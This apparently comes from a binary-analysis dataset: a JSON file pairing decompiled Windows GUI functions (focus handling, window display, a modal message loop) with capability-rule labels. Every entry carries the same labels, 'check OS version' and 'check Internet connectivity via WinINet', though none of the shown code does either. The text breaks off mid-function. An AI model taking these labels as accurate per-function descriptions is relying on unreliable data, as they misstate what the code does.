    "00454450": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00454450(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x461cdc = *0x461cdc + 1;\n    if (*(in_EAX + 0x250) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x220) = 0;\n        }\n        else {\n            *(in_EAX + 0x220) = param_2;\n        }\n    }\n    *(*0x463bb4 + 100) = param_2;\n    *(*0x463bb4 + 0x68) = in_EAX;\n    fcn.00413ca8();\n    fcn.00413be0();\n    cVar2 = fcn.004033e4();\n    if (cVar2 == '\\0') {\n        *(*0x463bb4 + 0x6c) = 0;\n    }\n    else {\n        *(*0x463bb4 + 0x6c) = in_EAX;\n        fcn.00413ca8();\n        fcn.00413be0();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x4546dc;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (in_EAX != *(*0x463bb4 + 0x78)) {\n        if (*(*0x463bb4 + 0x78) != 0) {\n            fcn.0043fd08();\n            *(*0x463bb4 + 0x78) = 0;\n            cVar2 = fcn.00450488();\n            if (cVar2 == '\\0') {\n                fcn.00403a90();\n                return 0;\n            }\n        }\n        *(*0x463bb4 + 0x78) = in_EAX;\n        fcn.0043fd08();\n        cVar2 = fcn.00450488();\n        if (cVar2 == '\\0') {\n            fcn.00403a90();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x224) == 0) {\n        *(in_EAX + 0x224) = in_EAX;\n    }\n    if (*(in_EAX + 0x224) != param_2) {\n        while ((*(in_EAX + 0x224) != 0 && (cVar2 = fcn.0043c7e4(),  cVar2 == '\\0'))) {\n            fcn.0043fd08();\n            *(in_EAX + 0x224) = *(*(in_EAX + 0x224) + 0x30);\n            cVar2 = fcn.00450488();\n            if (cVar2 == '\\0') {\n                fcn.00403a90();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x224) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x224));\n            *(in_EAX + 0x224) = iVar3;\n            fcn.0043fd08();\n            cVar2 = fcn.00450488();\n            if (cVar2 == '\\0') {\n                fcn.00403a90();\n                return 0;\n            }\n        }\n        for (piVar1 = *(param_2 + 0x30); piVar1 != NULL; piVar1 = piVar1[0xc]) {\n            cVar2 = fcn.004033e4();\n            if (cVar2 != '\\0') {\n                (**(*piVar1 + 0xcc))();\n            }\n        }\n        fcn.0043a6d4(param_2);\n        if ((*(in_EAX + 0x27c) != 0) && (*(in_EAX + 0x27c) != param_2)) {\n            iVar4 = 0;\n            fcn.0043a6d4(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x4546dc & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1060
    },
    "004546e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004546e4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    uVar1 = fcn.0043fd08();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.0043fd08();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00454734": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454734(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x22e) = param_2;\n    if (*(in_EAX + 0x27c) != 0) {\n        fcn.0043a6d4(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x220) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.00440130(0, 1);\n            fcn.0045432c();\n        }\n        fcn.004547e8();\n        fcn.004546e4();\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "00454798": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454798(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x22e) != '\\0') && (*(in_EAX + 0x220) != 0)) {\n        fcn.0043a6d4(param_2);\n    }\n    if (*(in_EAX + 0x22f) == '\\x02') {\n        iVar1 = fcn.004533b0();\n        if (iVar1 != 0) {\n            fcn.004533b0();\n            fcn.00454798();\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004547e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004547e8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x2f4) & 8) == 0) && (*(*0x463bb0 + 0x44) != 0)) && (*(*(*0x463bb0 + 0x44) + 0x248) != 0)) &&\n       ((in_EAX != *(*0x463bb0 + 0x44) && ((*(in_EAX + 0x22f) == '\\x01' || (*(*(*0x463bb0 + 0x44) + 0x22f) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.0044d814();\n        }\n        else {\n            fcn.0044d7f8();\n        }\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00454978": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00454978(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x454991;\n    fcn.0041d510();\n    uStack24 = 0x454a26;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x4549af;\n    puStack20 = &stack0xfffffffc;\n    fcn.0041d884();\n    uStack36 = 0x454a03;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(in_EAX + 0x250) == 0) {\n        puStack32 = &stack0xfffffffc;\n        fcn.00403454();\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        (**(**(in_EAX + 0x250) + 0x28))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x454a0a;\n    uStack36 = 0x454a02;\n    fcn.0041d884();\n    return;\n}\n",
        "token_count": 316
    },
    "00454d30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454d30(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x9b) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        uVar1 = fcn.0043fd08();\n        iVar2 = sub.user32.dll_IsIconic(uVar1);\n        if (iVar2 == 0) {\n            uVar1 = fcn.0043fd08(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar1);\n            uVar1 = fcn.0043fd08(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar1);\n            if (*(in_EAX + 0x22e) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.00439bc8();\n            return;\n        }\n    }\n    fcn.0043abf0();\n    return;\n}\n",
        "token_count": 291
    },
    "00454ea4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454ea4(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x454f3f;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x248) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.0044cba8();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.00459c60();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0043663c();\n            fcn.00459c60();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x454f46;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 444
    },
    "00455234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00455234(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x150) == '\\x01') && (*(in_EAX + 0x158) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x150) == '\\0') && (*(in_EAX + 0x154) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "004552a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004552a0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_10h = 0;\n    uStack56 = 0x4553f1;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack52 = &stack0xfffffffc;\n            for (iVar2 = fcn.004363b8(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.00455234();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x004553db;\n            fcn.0045526c(&fcn.004552a0::var_10h);\n            fcn.00412708();\n            fcn.00439044();\n            fcn.00406974();\n        }\n        else {\n            var_9h._0_1_ = '\\x01';\n            *NULL = fcn.004551f4(&stack0xfffffffc);\n            if (*NULL == 0) {\n                *NULL = fcn.004551f4(&stack0xfffffffc);\n            }\n            fcn.00412708();\n            fcn.00439044();\n            fcn.00406974();\n        }\n        if (((*(in_EAX + 0x228) & 8) == 0) || (var_9h != '\\x01')) {\n            if (var_9h == '\\x01') {\n                fcn.00459904();\n            }\n            else if (var_9h == '\\0') {\n                fcn.0045989c();\n            }\n        }\n        else {\n            fcn.0045996c();\n            fcn.0045996c();\n        }\n    }\ncode_r0x004553db:\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x4553f8;\n    uStack56 = 0x4553f0;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 627
    },
    "004554a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004554a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x2e2) != '\\0') && ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) {\n        fcn.004534b0();\n        fcn.00456c78();\n        fcn.004534b0();\n        fcn.00456c78();\n        fcn.00455474(arg_8h);\n        fcn.004534b0();\n        fcn.00456c78();\n        fcn.00455474(arg_8h_00);\n        fcn.00455474(&stack0xfffffffc);\n        fcn.00455474(&stack0xfffffffc);\n    }\n    fcn.0043e2a4();\n    return;\n}\n",
        "token_count": 303
    },
    "0045563c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045563c(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x455ba6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xbd) & 4) != 0)) {\n        puStack40 = 0x45567d;\n        fcn.00405b0c();\n        puStack40 = 0x45568c;\n        fcn.0040b538();\n        puStack40 = 0x455691;\n        fcn.004039e4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x45569b;\n    fcn.00459d50();\n    *(in_EAX + 0xbd) = *(in_EAX + 0xbd) | 4;\n    uStack44 = 0x455b89;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1a6) == '\\0') {\n            iStack56 = 0x455a90;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.00403454();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x463bb4 + 0x6c) == in_EAX) {\n                puStack52 = 0x455abe;\n                fcn.004547e8();\n            }\n            if (*(in_EAX + 0x22f) == '\\x01') {\n                puStack52 = 0x455ad2;\n                fcn.0043d260();\n            }\n            else if ((*(in_EAX + 0xbd) & 8) == 0) {\n                iVar6 = 0;\n                puStack52 = 0x455b0c;\n                iVar4 = fcn.0043fd08();\n                puStack52 = 0x455b13;\n                iVar5 = sub.user32.dll_GetActiveWindow();\n                if (iVar4 == iVar5) {\n                    puStack52 = 0x455b1f;\n                    puStack52 = fcn.0043fd08();\n                    iStack56 = 0x455b25;\n                    iVar4 = sub.user32.dll_IsIconic();\n                    if (iVar4 == 0) {\n                        iStack56 = 0x455b31;\n                        fcn.0043fd08();\n                        iStack56 = 0x455b36;\n                        iVar6 = fcn.0045044c();\n                    }\n                }\n                if (iVar6 == 0) {\n                    iStack56 = 0;\n                    uStack60 = 0x455b6b;\n                    uStack60 = fcn.0043fd08();\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    iStack56 = 0x97;\n                    uStack60 = 0;\n                    uVar3 = fcn.0043fd08(0, 0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar3);\n                    sub.user32.dll_SetActiveWindow(iVar6);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar3 = fcn.0043fd08(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar3);\n            }\n        }\n        else {\n            iStack56 = 0x4556f4;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.00403454();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x8c) == '\\x04') || ((*(in_EAX + 0x8c) == '\\x06' && (*(in_EAX + 0x22f) == '\\x01')))) {\n                if (*(in_EAX + 0x22f) == '\\x01') {\n                    puStack52 = 0x455750;\n                    fcn.00438f30();\n                    puStack52 = 0x45576c;\n                    fcn.00438f74();\n                }\n                else {\n                    puStack52 = 0x455785;\n                    fcn.00456ed4();\n                    puStack52 = 0x45579e;\n                    fcn.00456ec8();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4557d4;\n                (**(*in_EAX + 0x84))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    iStack56 = 0x4557e9;\n                    fcn.00453a98();\n                }\n            }\n            else if (*(in_EAX + 0x8c) - 6U < 2) {\n                iVar4 = *(*0x463bb0 + 0x44);\n                if (*(in_EAX + 0x8c) == '\\a') {\n                    puStack52 = 0x45582a;\n                    cVar2 = fcn.004033e4();\n                    if (cVar2 != '\\0') {\n                        iVar4 = in_EAX[1];\n                    }\n                }\n                if (iVar4 == 0) {\n                    puStack52 = 0x45586a;\n                    fcn.00456ed4();\n                    puStack52 = 0x455883;\n                    fcn.00456ec8();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4558b9;\n                (**(*in_EAX + 0x84))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    iStack56 = 0x4558ce;\n                    fcn.00453a98();\n                }\n            }\n            else if (*(in_EAX + 0x8c) == '\\x05') {\n                if (*(in_EAX + 0x22f) == '\\x01') {\n                    puStack52 = 0x4558f4;\n                    fcn.00438f30();\n                    puStack52 = 0x455910;\n                    fcn.00438f74();\n                }\n                else {\n                    puStack52 = 0x455929;\n                    fcn.00456f04();\n                    puStack52 = 0x455942;\n                    fcn.00456ef8();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x455978;\n                (**(*in_EAX + 0x84))();\n            }\n            *(in_EAX + 0x8c) = 0;\n            if (*(in_EAX + 0x22f) == '\\x01') {\n                if (*(in_EAX + 0x22b) == '\\x02') {\n                    iStack56 = 0;\n                    uStack60 = 0x4559a8;\n                    uStack60 = fcn.0043fd08();\n                    sub.user32.dll_SendMessageA(*(*(*0x463bb0 + 0x44) + 0x254), 0x223);\n                    uVar3 = fcn.0043fd08(3);\n                    sub.user32.dll_ShowWindow(uVar3);\n                }\n                else {\n                    iStack56 = *(*(in_EAX + 0x22b) * 4 + 0x461d4c);\n                    uStack60 = 0x4559ee;\n                    uStack60 = fcn.0043fd08();\n                    sub.user32.dll_ShowWindow();\n                    uVar3 = fcn.0043fd08(5, 0, in_EAX[0x12] | in_EAX[0x13] << 0x10);\n                    sub.user32.dll_CallWindowProcA(0x406474, uVar3);\n                    fcn.0043978c();\n                }\n                uStack60 = *(*(*0x463bb0 + 0x44) + 0x254);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                iStack56 = *(*(in_EAX + 0x22b) * 4 + 0x461d4c);\n                uStack60 = 0x455a61;\n                uStack60 = fcn.0043fd08();\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    *(in_EAX + 0xbd) = *(in_EAX + 0xbd) & 0xfb;\n    return;\n}\n",
        "token_count": 2207
    },
    "00455c34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455c34(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x455c60;\n            fcn.0041c71c();\n            uStack20 = 0x455c92;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x455c99;\n            uStack20 = 0x455c91;\n            fcn.00403258();\n            return;\n        }\n        puStack16 = 0x455c52;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00455ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00455ccc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xbd) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xe4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x22f) == '\\x01') {\n                if ((*(in_EAX + 0x8a) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.00403454();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x463bb0 + 0x44)) {\n                    fcn.00459450();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.00455e6c();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.00453a58();\n                }\n                else {\n                    fcn.00455f08();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0x93] = 2;\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "00455e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00455e8c(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x455efa;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x22e) != '\\0') goto code_r0x00455ee4;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x00455ebc:\n        puStack16 = puVar1;\n        fcn.00405b0c();\n        fcn.0040b538();\n        fcn.004039e4();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x00455ebc;\n    }\n    fcn.004546e4();\ncode_r0x00455ee4:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x455f01;\n    uStack20 = 0x455ef9;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 333
    },
    "00455f24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00455f24(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x4561ec;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x455f47;\n    fcn.00437d8c();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x455f58;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xbd) & 8) == 0)) && (*(in_EAX + 0x22f) != '\\x01')) goto code_r0x00455f95;\n    }\n    puStack60 = 0x455f81;\n    fcn.00405b0c();\n    puStack60 = 0x455f90;\n    fcn.0040b538();\n    puStack60 = 0x455f95;\n    fcn.004039e4();\ncode_r0x00455f95:\n    puStack60 = 0x455f9a;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x455fa9;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x455faf;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x455fb4;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x455fbe;\n    fcn.004583c4();\n    uStack64 = 0x4561cf;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xbd) = *(in_EAX + 0xbd) | 8;\n    puStack72 = 0x455fdb;\n    puStack60 = &stack0xfffffffc;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x455ffd;\n    fcn.00413be0();\n    *(*0x463bb4 + 0x78) = in_EAX;\n    puStack72 = 0x456021;\n    fcn.004573f4();\n    puStack72 = 0x456033;\n    fcn.004502fc();\n    uStack76 = 0x4561ad;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x45604c;\n    puStack72 = &stack0xfffffffc;\n    fcn.00455e74();\n    uStack88 = 0x45610c;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.0043fd08(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0x93] = 0;\n    do {\n        fcn.004591d0();\n        if (*(*0x463bb0 + 0x9c) == '\\0') {\n            if (in_EAX[0x93] != 0) {\n                fcn.00455dd4();\n            }\n        }\n        else {\n            in_EAX[0x93] = 2;\n        }\n    } while (in_EAX[0x93] == 0);\n    uVar3 = fcn.0043fd08(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.0043fd08();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    